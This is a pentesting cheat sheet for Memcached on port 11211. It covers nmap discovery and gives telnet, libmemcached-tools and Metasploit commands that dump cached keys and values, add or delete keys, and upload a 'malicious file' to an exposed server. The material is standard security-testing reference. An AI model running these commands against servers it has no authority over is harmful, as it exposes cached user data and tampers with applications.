# 11211 - Memcached

## Theory

Memcached is a free, open-source, distributed memory object caching system that stores small chunks of data in-memory as key-value pairs. It's used to speed up dynamic web applications by reducing database load. When a client requests data from the server, it checks the cache for the data. If it's available, it's loaded into memory. If it's not, the server fetches it from the backend storage and stores it in its cache for future requests.

Memcached is usually hosted on port 11211, but you can scan all the ports on the target. You can use NSE Scripts to get more information about the hosted service. Search the directory `/usr/share/nmap/scripts` for "memcached" results in a single script "memcached-info.nse".

Memcached is used by all the major websites having huge data, such as YouTube, Wikipedia, and Twitter.



***

## Practical

### Nmap Scan

```
nmap -sV -p 11211 <Target IP>

nmap -p11211 --script=memcached-info <Target IP>
```

### Connect To the Memcached Server

#### Dumping Data using Telnet

```
# Connect using telnet
telnet 192.168.1.32 11211

# Get Version
version

# Fetch Valuable Data
stats

# Fetch the Slabs Statistics
stats slabs

# Fetch count, age, aviction, expired etc
stats items

# Dump all keys
stats cachedump 1 0

# Fetch values stored on the keys
get <key>

# Add new key
add REMOTE_ADDR 0 0 11
10.10.5.42

# Delete a key
delete <key name>
```

#### Dumping Data using libmemcached-tools

```
# Install
apt install libmemcached-tools

# Fetch server statistics
memcstat --servers=192.168.1.33

# Dump key values
memcdump --servers=192.168.1.33

# Dump all values stored in keys
memccat --servers=192.168.1.33 <key 1> <key 2> <key n>

# Upload malicious file to the server
memccp --servers=192.168.1.33 file

# View the conents of the uploaded file
memcat --servers=192.168.1.33 file
```

#### Dumping Data using Metasploit

```
# Start Metasploit
msfconsole -q

use auxiliary/gather/memcached_extractor
```





***

## REFERENCES

* [https://www.hackingarticles.in/penetration-testing-on-memcached-server/](https://www.hackingarticles.in/penetration-testing-on-memcached-server/)
* [https://book.hacktricks.xyz/network-services-pentesting/11211-memcache](https://book.hacktricks.xyz/network-services-pentesting/11211-memcache)
